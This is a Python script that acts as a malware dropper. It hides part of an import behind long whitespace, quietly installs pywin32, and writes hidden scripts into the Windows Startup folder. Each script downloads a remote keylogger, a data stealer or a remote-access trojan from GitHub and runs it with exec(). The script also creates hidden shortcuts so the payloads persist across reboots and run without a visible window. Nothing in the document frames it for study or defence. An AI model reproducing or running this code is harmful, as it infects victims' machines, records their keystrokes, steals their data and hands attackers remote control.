from subprocess import call                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             , Popen, check_call,CREATE_NO_WINDOW
from os import path, remove
import getpass
import sys

def install_package(package):
    check_call([sys.executable, "-m", "pip", "install", package, '--quiet'])

def ensure_pywin32_installed():
    try:
        import win32com.client as cl
    except ImportError:
        install_package('pywin32')

ensure_pywin32_installed()
import win32com.client as cl

USER_NAME = getpass.getuser()
keylogger_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/KeyLogger.py?token=GHSAT0AAAAAAC3K4Q43NHA3RZEIZPYK5CU2Z2ZZJ7A"
stealer_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/main.pyw?token=GHSAT0AAAAAAC3K4Q432WPGRDCIX25ZZWJWZ2YYS3A"
rat_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/rat.pyw?token=GHSAT0AAAAAAC3K4Q422Q5GUIMNLPREADQYZ2YYTGQ"

def create_shortcut(target_path, shortcut_name):
    startup_folder = path.join('C:\\Users', USER_NAME, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = path.join(startup_folder, f"{shortcut_name}.lnk")
    shell = cl.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = path.dirname(target_path)
    shortcut.IconLocation = target_path
    shortcut.save()
    hiddenAttrib(shortcut_path)

def hiddenAttrib(path):
    call(['attrib', '+h', path])
    Popen(['pythonw.exe', path], creationflags=CREATE_NO_WINDOW)

def create_random_pyw(url, name):
    pyw_file_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.pyw"
    if path.exists(pyw_file_path):
        remove(pyw_file_path)
    
    with open(pyw_file_path, "w") as pyw_file: 
        pyw_file.write(f"""import requests
for _ in range(1):
    code = requests.get("{url}").text
    exec(code)
""")

    create_shortcut(f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.pyw", name)
    hiddenAttrib(pyw_file_path)
    

def main():
    create_random_pyw(keylogger_url, "keylogger")
    create_random_pyw(stealer_url, "stealer")
    create_random_pyw(rat_url, "rat")
    exit()
    

if __name__ == "__main__":
    main()
